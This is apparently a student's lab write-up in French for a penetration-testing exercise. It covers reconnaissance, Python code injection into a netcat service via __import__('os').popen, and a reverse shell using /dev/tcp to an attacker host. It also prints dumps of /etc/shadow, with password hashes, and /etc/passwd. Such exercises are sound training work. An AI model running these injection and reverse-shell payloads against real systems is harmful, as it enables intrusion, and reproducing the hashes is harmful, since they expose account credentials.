## I. Pentest

### 1. Reconnaissance

🌞 Déterminer

- **IP**

"10.1.1.2".

- **port**

"1337".


🌞 Scanner le réseau

[Scan nmap](/TP5/tp5capture.pcapng)

🌞 Connectez-vous au serveur

```
host = '10.33.72.148'
port = 13337   
```

### 2. Exploit

🌞 Injecter du code serveur

```
nc 10.33.72.148 13337
Ok
Hello__import__('os').popen('ls').read()
afs
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

### 3. Reverse shell

🌞 Obtenez un reverse shell sur le serveur


```
nc -lvnp 9999
listening on 0.0.0.0 9999 ...
```

```
nc 10.33.72.148 13337
Ok
Hello__import__('os').popen('sh -i >& /dev/tcp/10.33.73.79/9999 0>&1').read()
```


🌞 Pwn

```
# cat /etc/shadow
root:$6$zEk1UBcRHlrijLhs$/1dzLO/IL.CSZuDFqhGsfwqMWLqcEqANgi/zoptiNyztK3PKX4uX.TBRaoaZ120sTVCT7awPUUF3s62Hs2yfN.::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19653::::::
dbus:!!:19653::::::
tss:!!:19653::::::
sssd:!!:19653::::::
sshd:!!:19653::::::
chrony:!!:19653::::::
systemd-oom:!*:19653::::::
hugo:$6$Y5.0u9zww/X1I33x$PZxU8Ghsb7UOgEpRgjWERYj/Un58bEOig3MYF90y5fo9H.X5sZ6qluhSKqxekAPkwMU6sxw3fn.Z1TZ2bVrdF/::0:99999:7:::
tcpdump:!!:19653::::::
netdata:!!:20014::::::

# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
hugo:x:1000:1000:hugo:/home/hugo:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
netdata:x:991:991:NetData User:/var/log/netdata:/sbin/nologin
```

